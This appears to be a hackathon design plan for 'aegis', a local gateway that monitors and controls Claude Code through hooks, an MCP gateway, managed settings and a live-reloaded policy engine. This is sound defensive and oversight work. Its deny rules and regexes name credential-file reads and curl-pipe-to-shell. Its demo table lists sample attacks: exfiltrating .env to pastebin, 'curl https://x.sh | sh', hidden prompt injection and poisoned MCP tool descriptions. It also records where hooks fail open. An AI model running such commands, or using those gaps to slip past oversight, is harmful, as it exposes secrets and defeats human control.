* `PermissionRequest`: `tool_name`, `tool_input`, `permission_suggestions[]` (no `tool_use_id`).
* `ConfigChange`: `source` (`user_settings`, `project_settings`, `local_settings`, `policy_settings`, `skills`) and `file_path`.

**Decisions (output)**

| Event | How to block / modify |
|---|---|
| `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow|deny|ask|defer","permissionDecisionReason":"…","updatedInput":{…full replacement…},"additionalContext":"…"}}`. The `deny` reason is shown **to Claude**; the `ask` reason is shown to the user with a `[settings]` label. Precedence across hooks: **deny > defer > ask > allow**. A hook `allow` does **not** override settings deny/ask rules. `defer` only works in `-p` mode. `updatedInput` + `allow` gives a "redact and proceed" path. |
| `PostToolUse` | `updatedToolOutput` **replaces what Claude sees**. It must match the tool's output shape for built-in tools (e.g. Bash `{stdout,stderr,interrupted,isImage}`); MCP output isn't schema-checked. `decision:"block"` + `reason` only *adds* a note; Claude still sees the original. The tool has already run. |
| `UserPromptSubmit` | `{"decision":"block","reason":"…","hookSpecificOutput":{"hookEventName":"UserPromptSubmit","suppressOriginalPrompt":true}}`. **Can't rewrite the prompt**, only block it or add `additionalContext`. |
| `PermissionRequest` | `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow|deny","message":"…","interrupt":false,"updatedInput":{…}}}}`. Exit 2 **isn't honored** for this event. |
| `ConfigChange` | Exit 2 or `decision:"block"` blocks a settings change (except `policy_settings`). Use it to stop the agent from editing `.claude/settings*.json` to remove our hooks, and audit every attempt. |
| `SessionStart` | `additionalContext` (e.g. "This session is governed by aegis policy v7; denied actions include a reason") and `sessionTitle`. |
| `Stop`/`SessionEnd` | Use `async: true` for logging. Flush session summary to the dashboard. |

**Exit codes**
* `0`: success. JSON on stdout is parsed if it starts with `{` and ends with `}`.
* **`2`: blocking.** Stderr becomes the reason, and JSON can't override it.
* Any other code: **non-blocking**, so the action proceeds. A missing or non-executable hook script also proceeds silently with a notice, so policy hooks must be tested on first run.

**Timeouts.** The default is 600 s for command, http and mcp_tool hooks, and 30 s on `UserPromptSubmit`. **A timed-out command, http or mcp_tool PreToolUse hook does not block.** For HTTP hooks, non-2xx, connection failure and timeout are all **non-blocking**, and only a 2xx JSON body can deny. **So `type:"http"` hooks fail open.**

**Recommended hook transport: `aegis-hook`, a static Go binary run as an exec-form command hook**
* Reads stdin (≤ 2 MB) and POSTs it to `http://127.0.0.1:8787/v1/hooks/claude-code` with a 1.5 s deadline. A token comes from a file, so it never sits in an env var visible to `Bash`.
* On success it prints the gateway's JSON, which is already in Claude Code hook format, and exits 0.
* On gateway error or timeout it applies `fail_mode` from a local cache file:
  * `PreToolUse` / `UserPromptSubmit` **fail closed** with `exit 2` and stderr "aegis gateway unreachable (fail-closed)".
  * `PermissionRequest` fails closed with a JSON `deny`.
  * Logging events fail open.
* Go process start is about 5–10 ms, cheap per tool call. Set `"timeout": 5` in the hook entries.
* The gateway returns **no decision** (`exit 0`, empty) for policy `pass`, so Claude Code's own permission flow still applies. It returns `allow` only for controls that explicitly auto-approve.

**Settings snippet** (project `.claude/settings.json`; in hardened mode the same block lives in managed settings with `allowManagedHooksOnly: true`):
```json
{
  "hooks": {
    "SessionStart":     [{ "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "UserPromptSubmit": [{ "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "PreToolUse":       [{ "matcher": "*", "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "PostToolUse":      [{ "matcher": "*", "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "PermissionRequest":[{ "matcher": "*", "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "ConfigChange":     [{ "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "timeout": 5 }] }],
    "SessionEnd":       [{ "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/bin/aegis-hook", "args": [], "async": true }] }]
  },
  "allowedHttpHookUrls": ["http://127.0.0.1:8787/*"]
}
```
**Notes**
* Matcher `*` covers built-in tools and every `mcp__<server>__<tool>`.
* Hooks also fire inside subagents, with `agent_id` set.
* Hooks don't fire for `@file` references inserted into the prompt. Cover those with a `Read(./.env)` permission deny rule and gateway-side redaction.
* Installed **mods** can override a PreToolUse block unless the hook comes from **managed settings**. One more reason to deploy enforcement hooks as managed settings for the hardened demo.

### 3.3 Layer 3: route all MCP servers through the MCP gateway
Docs: [MCP](https://code.claude.com/docs/en/mcp) · [Managed MCP](https://code.claude.com/docs/en/managed-mcp)

Project `.mcp.json` for the demo (Claude Code supports `http`, `sse` (deprecated), `stdio` and `ws`):
```json
{
  "mcpServers": {
    "github":  { "type": "http",  "url": "http://127.0.0.1:8787/mcp/github" },
    "evil":    { "type": "http",  "url": "http://127.0.0.1:8787/mcp/evil-demo" },
    "fs":      { "type": "stdio", "command": "/usr/local/bin/aegis-mcp",
                 "args": ["stdio", "--server", "fs", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/tmp/demo"] }
  }
}
```
Upstream URLs and credentials live in the **gateway catalog**, not in `.mcp.json`. The gateway injects upstream auth, so Claude Code never holds third-party tokens.

**Hardening, so the user can't add a server that bypasses the gateway.** Either:
* **Exclusive control:** `/Library/Application Support/ClaudeCode/managed-mcp.json` (same format as `.mcp.json`) listing only gateway-fronted servers. Users can't add others, and `--mcp-config` or `--strict-mcp-config` makes Claude Code exit. Verify with `claude mcp list`, and check that `claude mcp add …` fails with "enterprise MCP configuration is active". Or:
* **Allowlist:** managed settings with
  ```json
  { "allowManagedMcpServersOnly": true,
    "allowedMcpServers": [ { "serverUrl": "http://127.0.0.1:8787/mcp/*" },
                           { "serverCommand": ["/usr/local/bin/aegis-mcp","stdio","--server","fs","--","npx","-y","@modelcontextprotocol/server-filesystem","/tmp/demo"] } ] }
  ```
  `serverCommand` matches exactly, every argument in order. `serverUrl` supports `*`. `serverName` is **not** a security control.

### 3.4 Layer 4: managed policy (organization lock-down of the harness)
Docs: [Managed settings](https://code.claude.com/docs/en/managed-settings) · [Settings reference](https://code.claude.com/docs/en/settings-reference) · [Server-managed settings](https://code.claude.com/docs/en/server-managed-settings)

* **macOS file paths** (admin write):
  * `/Library/Application Support/ClaudeCode/managed-settings.json`
  * the `managed-settings.d/*.json` drop-in directory
  * `managed-mcp.json`
* **Precedence:** managed > CLI `--settings` > project local > project shared > user. Hooks **merge** across levels. `disableAllHooks` outside managed settings can't disable managed hooks.
* **Live reload:** settings files are watched and reloaded live, including `permissions`, `hooks` and `apiKeyHelper`. A malformed managed file makes Claude Code **refuse to start**, so validate before deploying.

Hardened demo profile (`managed-settings.json`):
```json
{
  "env": { "ANTHROPIC_BASE_URL": "http://127.0.0.1:8787", "CLAUDE_CODE_GATEWAY_HINT_HEADERS": "1",
           "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB": "1", "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1" },
  "allowedProviders": ["customEndpoint"],
  "allowManagedHooksOnly": true,
  "allowManagedPermissionRulesOnly": true,
  "allowManagedMcpServersOnly": true,
  "allowedMcpServers": [ { "serverUrl": "http://127.0.0.1:8787/mcp/*" } ],
  "allowedHttpHookUrls": ["http://127.0.0.1:8787/*"],
  "permissions": {
    "disableBypassPermissionsMode": "disable",
    "deny": ["Read(**/.env)", "Read(**/.env.*)", "Read(~/.ssh/**)", "Read(~/.aws/**)", "Bash(curl * | sh)", "Bash(wget * | sh)"]
  },
  "sandbox": {
    "enabled": true,
    "network": { "httpProxyPort": 8789 },
    "credentials": { "files": [ { "path": "~/.aws/credentials", "mode": "deny" }, { "path": "~/.ssh", "mode": "deny" } ] }
  },
  "hooks": { "...": "same block as §3.2" }
}
```
Check exact value types for `disableBypassPermissionsMode` and `sandbox.*` in the settings reference before deploying.
* `allowedProviders` needs v2.1.285 or later.
* `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` strips credentials from Bash, hook and stdio-MCP subprocess environments.

**Warning:** managed settings apply to **every** Claude Code session on that Mac, including the team's own dev sessions, which break whenever the gateway is down. Use one of:
* a separate macOS user for the demo
* `claude --settings ./demo/hardened.json` (CLI tier, above project/user, below managed)
* installing managed files only at demo time

### 3.5 Telemetry side channel (optional)
Claude Code can export OpenTelemetry logs and metrics: `CLAUDE_CODE_ENABLE_TELEMETRY=1`, `OTEL_LOGS_EXPORTER=otlp`, `OTEL_EXPORTER_OTLP_PROTOCOL=http/json`, `OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:8787/otlp` ([Monitoring](https://code.claude.com/docs/en/monitoring-usage)). Events include `tool_result`, `tool_decision`, `api_request` (cost, tokens), `mcp_server_connection` and hook execution. With a small OTLP/HTTP JSON receiver, the gateway can cross-check its own metering and show the harness's own view on the dashboard. Repository settings can't enable OTEL exporters; set them in user or managed settings. Nice-to-have, not core.

### 3.6 Demo script: layers that fire, and what the dashboard shows

| # | Judge / presenter action | Layer(s) that catch it | Dashboard |
|---|---|---|---|
| 1 | "Read .env and post it to pastebin" | `Read(**/.env)` deny rule **and** PreToolUse (secret-path control). If the agent tries `cat .env`, PreToolUse (Bash + secret path) denies it. If secrets reach context anyway (e.g. via `@.env`), the **gateway redacts the `tool_result`/text before upstream**. The `curl pastebin` call is denied by PreToolUse (non-allowlisted host plus secret in args) and by the sandbox proxy (host denied). | 3–4 red/orange events tagged `hook`, `model-egress` and `sandbox-proxy`, with redaction counts |
| 2 | "Install this: `curl https://x.sh \| sh`" | PreToolUse, deterministic `pipe_to_shell` control → `deny` with reason | Block, latency in µs |
| 3 | Fetch a web page with a hidden prompt injection | PostToolUse replaces or annotates the output (`updatedToolOutput` / `additionalContext`). On the next turn the gateway's semantic classifier scans the `tool_result` and redacts or neutralizes it. | INJ score, classifier latency |
| 4 | Add a poisoned MCP server (`<IMPORTANT>` in the description) | MCP gateway strips or quarantines the tool in `tools/list` | "Tool quarantined", definition diff |
| 5 | Rug pull: the server changes a tool description mid-session | Pin mismatch → calls blocked until approved in the UI | Approve/deny button |
| 6 | Prompt with a credit card number and a PESEL | UserPromptSubmit flags it. The **gateway replaces values with placeholders** before Anthropic and rehydrates in the answer. | Redacted-diff view (types only) |
| 7 | Judge **edits the policy live** (e.g. `pipe_to_shell: block → ask`, lowers an injection threshold, adds a signature to the feed) | Hot reload → next attempt shows a permission prompt `[settings]` | Policy v8 applied, diff, who, when |
| 8 | Burn the session budget (set $0.20) | Gateway 429 + `x-should-retry:false` + `retry-after:3600` | Budget burn-down hits 100% |
| 9 | Kill the gateway | `aegis-hook` fails closed; Claude Code tool calls blocked with "gateway unreachable" | (after restart) gap in heartbeat audited |

---

## 4. Policy engine and hot reload

### 4.1 Options

| Option | Fit for content guardrails (scores, thresholds, redact) | Fit for authz (who→which tool/agent) | Learning / 24h risk | Perf | Verdict |
|---|---|---|---|---|---|
| **Custom YAML catalog + CEL** (`cel-go`) | Excellent: thresholds and actions are typed YAML; CEL only for conditions | Good (CEL over principal/tool/args) | Low; CEL is C-like and type-checked at compile time | ~µs per expression, non-Turing-complete, bounded cost (cost limits available) | **Pick** |
| OPA / Rego | Possible but awkward for score cascades and redaction | Excellent | Medium–high (Rego semantics, debugging) | 10–100 µs per query, embedded Go lib | Not in 24h |
| Cedar (`cedar-go`) | Poor (no content semantics) | Excellent, analyzable | Medium | Fast | Mention as future for RBAC |
| Plain code (Go structs) | Fine | Fine | Lowest | Fastest | Fails "judges edit config live" |
| Go `expr` lib | Similar to CEL | Similar | Low | Fast | CEL preferred (standard; also used by agentgateway, Envoy and Kubernetes) |

### 4.2 Control catalog shape (architecture-level sketch; the policy-file track owns the final schema)
```yaml
version: 7                          # bumped by the reloader, not humans
metadata: { name: hackyeah-demo, owner: secops@team }
defaults:
  on_detector_error: fail_closed    # per control override: fail_open
  semantic_timeout_ms: 250
  stream_mode: holdback             # passthrough | holdback | buffered
trust_zones:
  local:  [ "ollama", "mcp:fs", "tool:Edit", "tool:Write" ]
  remote: [ "anthropic", "openai:*", "mcp:github", "a2a:*", "egress:*" ]
models:
  allowed: [ "claude-sonnet-*", "claude-haiku-*", "claude-opus-*", "qwen3:*", "granite3-guardian:*" ]
  routes:  { "claude-*": anthropic, "qwen3:*": ollama }
budgets:
  - { scope: "team:blue", window: 1d, limit_usd: 5.00, soft_pct: 80, on_soft: warn, on_hard: block }
  - { scope: "session:*",  window: session, limit_usd: 1.00 }
  - { scope: "model:ollama/*", window: 1h, limit_tokens: 200000 }
feeds:
  - { id: attack-sigs, url: "https://raw.githubusercontent.com/<org>/aegis-feed/main/signatures.yaml", poll_s: 30, verify_sha256: true }
controls:
  - id: SEC-001
    name: Secrets never leave the machine
    surfaces: [model.request, tool.input, mcp.call, a2a.message, egress.http]
    detector: secrets                       # deterministic (gitleaks-style rules)
    action: redact                          # block | redact | ask | log | pass
  - id: PII-002
    name: PII/PCI to remote destinations
    surfaces: [model.request, mcp.call, a2a.message, egress.http]
    when: 'dest.zone == "remote"'
    detector: pii
    params: { entities: [EMAIL, PHONE, PESEL, NIP, IBAN, CREDIT_CARD, PERSON, ADDRESS] }
    thresholds: { redact: 0.50, block: 0.97 }   # "adherence %": confidence -> action ladder
    reversible: true
  - id: INJ-003
    name: Prompt injection (direct + indirect)
    surfaces: [model.request.user, tool.output, mcp.result, a2a.result]
    detector: [signatures:attack-sigs, prompt_guard, embed_similarity]
    thresholds: { log: 0.30, ask: 0.60, block: 0.85 }
  - id: CC-010
    name: Pipe-to-shell
    surfaces: [tool.input]
    when: 'tool.name == "Bash" && tool.input.command.matches("(curl|wget)[^|]*\\|\\s*(ba|z)?sh")'
    action: block
  - id: MCP-020
    name: Tool definition pinning
    surfaces: [mcp.list]
    detector: tool_pin
    action: quarantine
```

### 4.3 Hot reload pipeline (judges will edit live)
1. **Sources.** The catalog file is watched with `fsnotify` on the **directory**, because editors save via rename and a watch on the file is lost. Other sources: the dashboard editor (`PUT /api/policy`, with an `If-Match: <version>` optimistic lock), feed pollers (`ETag`/`If-None-Match`), and `SIGHUP`. Debounce 200 ms.
2. **Parse → validate.**
   * Parse YAML into the JSON Schema (also served to Monaco for in-editor validation).
   * Semantic checks: unique ids, known detectors, sane threshold ordering (`log < ask < block`), referenced feeds exist.
3. **Compile.**
   * CEL programs with cost limits.
   * RE2 regexes. Linear time, so no ReDoS from live edits.
   * Aho–Corasick automata.
   * Feed signatures, with **embedding vectors precomputed** through the sidecar in the background. The old version keeps serving meanwhile.
4. **Self-test gate.** Run the catalog's own `tests:` golden cases plus the built-in smoke set against the *candidate*. Reject if a must-block case passes.
5. **Atomic swap.** `atomic.Pointer[CompiledPolicy]`. Each request snapshots the pointer at ingress, so one request never sees two versions.
6. **Audit.** Write a `policy_change` event: version, sha256, author (UI user, file, or feed), unified diff, validation result, timestamp. It goes into the hash chain and is pushed to the dashboard via SSE. **On failure,** keep the old version and show the error inline in the editor and as a red toast.
7. **Rollback.** Keep the last N versions in SQLite. `POST /api/policy/rollback/{v}`.
8. **Propagation.** Hook decisions are made centrally, so nothing needs pushing to clients. The `aegis-hook` fail-mode cache file is rewritten on swap.

---

## 5. Recommended stack and architecture

### 5.1 Stack comparison

| Option | Latency / RAM | ML ecosystem | MCP / A2A SDKs | 24h risk | Notes |
|---|---|---|---|---|---|
| **Go gateway + Python sidecar** | Go hot path well under 1 ms, ~50 MB; sidecar only on semantic checks | Full (ONNX Runtime, transformers, Presidio, sentence-transformers) | Go: official MCP go-sdk, a2a-go. Python: official mcp, a2a-sdk | Medium: two runtimes and one internal API contract | **Recommended.** Splits naturally across 3–4 people. |
| All Python (FastAPI + httpx) | 1–3 ms overhead, 150–300 MB plus models | Best | Best | Low–medium | Fine fallback if nobody is comfortable in Go. Weaker "performance" story; GIL plus streaming rewrite is CPU-bound. |
| All TypeScript (Node 24, Hono/Fastify) | ~1 ms, 80–150 MB | Medium: `@huggingface/transformers` runs ONNX DeBERTa classifiers in Node | Best MCP SDK (TS reference) | Low–medium | Good alternative for a JS-heavy team. Same-language dashboard. |
| Rust | Best | Weak | agentgateway exists | High | Not in 24h |
| Build on **agentgateway** (Rust, AAIF; MCP+A2A+LLM, CEL, guardrail webhooks) or **LiteLLM** (Python proxy, guardrail hooks) | Good / heavy (LiteLLM 300–500 MB) | via webhooks / Python | built in | Learning curve; less originality for judges | Cite as prior art and "production path". Don't base the demo on them. |

### 5.2 Concrete picks
* **Gateway (Go 1.26, installed: go1.26.4):**
  * `net/http` with a custom SSE/NDJSON streamer
  * `google/cel-go`, `goccy/go-yaml`, `santhosh-tekuri/jsonschema/v6`, `fsnotify/fsnotify`
  * an Aho–Corasick lib
  * `modernc.org/sqlite` (pure Go)
  * HDR histograms for p50/p95/p99
  * `log/slog`
  * Prometheus text exposition at `/metrics`, hand-written or `prometheus/client_golang`
  * Secret rules: reuse the **gitleaks** rule set (MIT, TOML).
  * MCP mock servers and test harness: `modelcontextprotocol/go-sdk`.
* **Semantic sidecar (Python 3.12 via `uv`):** pin 3.12 to avoid wheel gaps on the installed 3.14.
  * FastAPI + uvicorn (1 worker) + ONNX Runtime (int8)
  * Prompt-injection classifier: **Llama Prompt Guard 2 22M** (DeBERTa-xsmall, 512-token window). It is under the Llama 4 Community License and the HF download is **gated**, so request access before the event. Fallback: `protectai/deberta-v3-base-prompt-injection-v2` (Apache-2.0).
  * Embeddings for signature similarity: `all-MiniLM-L6-v2` (Apache-2.0).
  * NER PII: Presidio + spaCy small models, including Polish `pl_core_news_sm`. The redaction track owns the details.
  * Endpoints: `POST /classify` (batch), `POST /embed`, `POST /pii`, `GET /health`.
  * Lazy-load models; warm them at startup in the background.
* **LLM judge (optional, async/escalation only):** Ollama with `granite3-guardian` (Apache-2.0), or `llama-guard3:1b` / `shieldgemma` (check licences). Run with `OLLAMA_MAX_LOADED_MODELS=1` and `OLLAMA_NUM_PARALLEL=1`. Use it only for grey-zone scores or offline triage, never inline on every token.
* **Dashboard:** Vite + React + TypeScript + Tailwind + shadcn/ui + Recharts + `@monaco-editor/react` with `monaco-yaml` (schema from `/api/policy/schema`) + native `EventSource`.
  * Build output `web/dist` is embedded via `go:embed` and served at `/ui`. In dev, Vite's dev server proxies `/api` to `:8787`.
  * Views:
    1. **Live decisions feed** (surface, actor, control, action, latency, redacted diff drawer)
    2. **Security**: blocks by category, top controls, feed status, MCP inventory with pin approvals
    3. **Management**: spend and tokens per team/session/model, local vs remote, budget burn-down
    4. **Performance**: per-stage latency histograms, overhead = total − upstream, scan-cache hit rate
    5. **Policy editor**: validate → apply → history, diff, rollback
    6. **Audit export**: JSONL/CSV download, hash-chain verify button
  * **Admin API security:** bind to 127.0.0.1, require a bearer token, check `Origin`, and use no CORS wildcard. Otherwise any web page could POST a policy change to localhost (CSRF / DNS rebinding).

### 5.3 Component diagram

```mermaid
flowchart LR
  subgraph Clients["Clients (trusted, local)"]
    CC["Claude Code<br/>ANTHROPIC_BASE_URL + hooks + .mcp.json"]
    APP["Apps / agents<br/>SDK wrapper, OPENAI_BASE_URL"]
    A2AC["A2A client agent"]
  end

  subgraph GW["aegis gateway (Go, single binary, 127.0.0.1)"]
    ING["Ingress adapters<br/>/v1/messages · /openai/v1 · :11434 ollama<br/>/mcp/* · aegis-mcp stdio · /a2a/* · /egress/* · :8789 fwd-proxy<br/>/v1/hooks/claude-code · /v1/guard"]
    ID["Identity & context<br/>virtual key · session/agent ids · trust zone"]
    PE["Policy engine<br/>compiled catalog (atomic ptr) · CEL"]
    DET["Deterministic detectors<br/>RE2 · Aho-Corasick · validators · pins"]
    SEMC["Semantic client<br/>parallel, deadline, fail-open/closed"]
    RED["Redactor + placeholder vault<br/>(per session, in-memory)"]
    BUD["Budget ledger<br/>reserve → settle"]
    RT["Router + upstream pool<br/>model allowlist, retries"]
    STR["Stream processor<br/>SSE/NDJSON, holdback, early-stop"]
    AUD["Audit (hash chain) + metrics (HDR)"]
    CFG["Config manager<br/>fsnotify · feed poller · validate · self-test · swap"]
    UI["Dashboard (embedded SPA) + admin API + SSE /api/events"]
  end

  SIDE["Semantic sidecar (Python)<br/>Prompt Guard 2 · PII NER · embeddings"]
  OLL["Ollama :11435<br/>local models + guard LLM"]
  DB[("SQLite WAL<br/>audit · budgets · pins · policy versions")]
  FEED["Attack-signature feed (URL/file)"]

  subgraph Remote["Untrusted / third party"]
    ANT["Anthropic API"]
    OAI["OpenAI-compatible free tiers"]
    MCPR["Remote MCP servers"]
    A2AR["Remote A2A agents"]
    EXT["3rd-party APIs / web"]
  end

  CC --> ING
  APP --> ING
  A2AC --> ING
  ING --> ID --> PE
  PE --> DET
  PE --> SEMC --> SIDE
  SEMC -.escalate.-> OLL
  PE --> RED
  PE --> BUD
  PE --> RT
  RT --> ANT & OAI & MCPR & A2AR & EXT & OLL
  RT --> STR --> ING
  PE --> AUD --> DB
  BUD --> DB
  CFG --> PE
  FEED --> CFG
  UI --> CFG
  AUD --> UI
```

Compact ASCII version for slides:
```
 Claude Code ─┬─ model ─────► :8787 /v1/messages ─┐
  (hooks)     ├─ tools ─────► aegis-hook ─► /v1/hooks ─┤
              ├─ MCP ───────► /mcp/* , aegis-mcp stdio ┤      ┌──────────────┐
              └─ Bash net ──► :8789 sandbox proxy ─────┤      │ Python       │
 Apps/agents ── SDK/base_url ► /openai /ollama /guard ─┤ ◄──► │ sidecar      │
 A2A agents ────────────────► /a2a/* ─────────────────┤      │ (classifiers)│
                                                       ▼      └──────────────┘
        ingress → identity → policy(CEL) → deterministic ‖ semantic → redact/budget
                → route → upstream → stream scan/rehydrate → audit+metrics → client
                                                       │
           SQLite (audit chain, budgets, pins, policy versions) · /ui dashboard (SSE)
                                                       ▼
        Anthropic · OpenAI-compat · Ollama(:11435) · remote MCP · A2A · 3rd-party APIs
```

### 5.4 Request lifecycle (model call; MCP, A2A and egress follow the same pipeline)

| # | Stage | What happens | Budget (p50 target) |
|---|---|---|---|
| 1 | **Ingress** | Accept on 127.0.0.1. Surface adapter normalizes to an internal `Envelope{surface, direction, actor, dest, model/tool, segments[], raw}`. Body cap. JSON parse once. | 50–300 µs (size-dependent) |
| 2 | **AuthN / identity** | Virtual key → team. Or passthrough mode: identity from `X-Aegis-*` and `x-claude-code-session-id` / `agent-id`. Strip our own headers before upstream. | <20 µs |
| 3 | **Policy lookup** | Snapshot the `CompiledPolicy` pointer. Select controls by surface and destination trust zone. Evaluate CEL `when`s. | <20 µs |
| 4 | **Budget pre-check** | Reserve the estimate. Hard stop → 429 (§2.1.4). | <10 µs |
| 5 | **Deterministic checks** | Scan only **new** segments (content-hash cache). Secrets, PII validators, signatures, denylists, model allowlist, tool rules, pins. Short-circuit on a definitive block. | 50–500 µs |
| 6 | **Semantic checks (parallel)** | Run only on untrusted segments, and only if no deterministic block. Fan out to sidecar detectors with `errgroup` and a per-control deadline (e.g. 250 ms). Short-circuit: the first `block` cancels the rest. Timeout or error applies the control's `on_detector_error` (fail_open → log + allow; fail_closed → block). Grey-zone scores can escalate to the LLM judge **asynchronously** (log only) or synchronously on high-risk routes. | 5–30 ms per classifier (int8, CPU); 0 if skipped |
| 7 | **Decide + transform** | Combine findings with the action ladder: `block > ask > redact > log > pass`. Apply deterministic placeholder redaction to text/tool_result segments only. Never touch system, tools or thinking. | <200 µs |
| 8 | **Upstream** | Router picks the upstream (allowlisted model; local vs remote). Forward headers per surface rules. `Accept-Encoding: identity`. Keep-alive pool. | upstream TTFT |
| 9 | **Output checks** | Stream processor (§2.1.2): per-block sliding window, holdback, rehydration, buffered tool_use evaluation, async semantic verdicts, graceful early stop, pings. | +0.05–0.3 ms per event |
| 10 | **Settle + audit + metrics** | Settle budget from `usage`. Append an audit record (hash chain: `h_n = sha256(h_{n-1} ‖ canonical(record))`) with redacted payload excerpts and finding fingerprints. Update HDR histograms per stage. Publish to the SSE live feed (ring buffer, drop-oldest under load). | async, off the hot path |

**Headline number for judges:** "Median gateway overhead for deterministic checks is X µs at Y rps." Measure it against a **mock upstream** in the repo that streams canned Anthropic and OpenAI SSE, so no tokens are spent. Use `hey`, `vegeta` or `k6`; dev tools only.

### 5.5 Process topology and RAM (8 GB Mac)
| Process | Port(s) | RSS estimate |
|---|---|---|
| `aegis` gateway (Go) | 8787 (API/UI/hooks/MCP/A2A), 11434 (Ollama facade), 8789 (forward/sandbox proxy) | 40–80 MB |
| `aegis-semantic` sidecar (Python) | 127.0.0.1:8790 | 0.5–0.9 GB (2–3 int8 models) |
| Ollama (optional) | 11435 | 0.6–1.5 GB with one 1–2B model loaded |
| Claude Code | — | 0.3–0.6 GB |
| Browser (dashboard) + editor | — | 1–2 GB |

**No Docker.** Docker Desktop's VM alone would take 2–4 GB.

### 5.6 Repo layout (single repo)
```
aegis/
  cmd/aegis/            # gateway main
  cmd/aegis-hook/       # Claude Code hook client (static binary)
  cmd/aegis-mcp/        # stdio MCP wrapper
  internal/{ingress,policy,detect,redact,vault,budget,route,stream,mcp,a2a,egress,audit,metrics,config,admin}/
  sidecar/              # Python (uv project): FastAPI + models
  web/                  # Vite React dashboard -> web/dist embedded
  policies/             # catalog.yaml, schema.json, examples
  feeds/                # sample attack-signature feed
  mocks/                # mock Anthropic/OpenAI SSE upstream, poisoned MCP server, toy A2A agents
  tests/                # black-box YAML cases + runner (positive/negative), golden SSE streams
  demo/                 # .mcp.json, settings (project + hardened --settings + managed), scripts
  docs/                 # architecture diagram, policy docs
  Makefile              # make run | test | demo | bench
```

### 5.7 Team split and 24h plan (3–4 people)
| Person | Owns |
|---|---|
| A: Gateway core (Go) | Ingress adapters, Anthropic/OpenAI/Ollama proxy, **stream processor**, router, mock upstreams |
| B: Policy and control plane (Go) | Catalog schema, CEL, hot reload, budgets ledger, audit chain, admin API, `aegis-hook`, MCP proxy |
| C: Detection (Python + feed) | Sidecar, classifiers, PII/NER (with the redaction track), attack-signature feed, **test suite** (positive/negative cases) |
| D: Dashboard and demo | React UI, SSE feed, Monaco editor, Claude Code wiring (settings, hooks, MCP), demo script, architecture diagram |

**Timeline**
* **H0–2:** freeze 3 contracts: the `Envelope`/`Decision` JSON, the catalog JSON Schema, and the audit event schema.
* **H2–10:** parallel build.
* **H10–14:** end-to-end with Claude Code.
* **H14–20:** tests, performance numbers, polish.
* **H20–24:** rehearse the demo, record a backup video, write docs, freeze.

Order of value: model proxy and hooks with deterministic controls first, then dashboard and hot reload, then the semantic sidecar, then MCP, then budgets UI, then A2A.

---

## 6. Top risks and mitigations

| # | Risk | Mitigation |
|---|---|---|
| 1 | **SSE rewriting breaks Claude Code**: malformed stream, retries, "response may be incomplete" | Ship a `passthrough` stream mode first. Golden-file tests with recorded real streams. Index-renumber tests. Feature-flag output rewriting per control. Always end with `message_delta` + `message_stop`. |
| 2 | **Body modification breaks caching or thinking signatures** | Never touch `system`, `tools`, thinking or `cache_control`. Redaction is deterministic and session-scoped (round-trip identity). Test 30+ turn sessions. |
| 3 | **Hooks fail open**: HTTP hook errors and timeouts are non-blocking; exit 1 is non-blocking; a mistyped path is silently skipped | `aegis-hook` command wrapper with explicit fail-closed `exit 2`. Startup self-check (SessionStart pings the gateway and warns if down). Hardened mode puts hooks in managed settings with `allowManagedHooksOnly`. |
| 4 | **Managed settings brick the team's own Claude Code** (gateway down → no model access) | Separate macOS user, or the `--settings` demo profile. Install managed files only for the hardened segment. Keep a `make unharden` script. |
| 5 | **MCP era split** (2025-11-25 stateful vs 2026-07-28 stateless; HeaderMismatch after redaction) | Message-level transparent proxy. Recompute `Mcp-Name`/`Mcp-Param-*` after rewriting. Test against both a legacy and a 2026 mock server. |
| 6 | **8 GB RAM pressure** | No Docker, int8 ONNX, lazy model load, one Ollama model, sidecar optional (deterministic-only mode still demos). |
| 7 | **Gated or licensed models** (Prompt Guard 2 = Llama 4 Community License, HF gating) | Request access before the event. Apache-2.0 fallbacks (protectai DeBERTa, all-MiniLM, Granite Guardian). Document licences in the README. |
| 8 | **Live config edits by judges** (invalid YAML, bad regex, contradictory thresholds) | Schema + compile + self-test gate, keep the old version, inline errors. RE2 means no ReDoS. Optimistic locking. Rollback button. |
| 9 | **Credential exposure through the proxy** (subscription OAuth tokens pass through) | Never log `Authorization` or `x-api-key` (scrub in middleware). Bind to 127.0.0.1. Admin API token + Origin check. |
| 10 | **Placeholder-injection / rehydration exfil** | Rehydrate only vault-issued placeholders, and only toward trusted zones. Re-apply egress policy after rehydration (PreToolUse + MCP gateway). |
| 11 | **Coverage gaps**: `@file` references skip PreToolUse; WebFetch isn't sandboxed; HTTPS bodies opaque to the sandbox proxy | Layering: permission deny rules + gateway redaction of model egress (the real chokepoint) + PreToolUse URL checks. Say "host-level only" honestly for opaque HTTPS. |
| 12 | **Version drift**: installed Claude Code 2.1.271 lacks hint headers (2.1.273), `mcp_server` hook field (2.1.274) and `allowedProviders` (2.1.285) | Update before the event, and degrade gracefully when headers are absent. |
| 13 | **Venue network flaky** | Mock upstreams + local Ollama path for every demo step. Pre-recorded backup video. |
| 14 | **Overscoping** (A2A, MITM proxy, LLM judge) | These are explicit stretch goals. The core demo is the model proxy, hooks, MCP, dashboard and hot reload. |

---

## 7. Pre-event checklist (no installs done in this research)
- [ ] `claude update` (target ≥ 2.1.285). Confirm `x-claude-code-session-id` equals the hook `session_id`, and `x-claude-code-prompt-id` equals the hook `prompt_id` (expected, unverified).
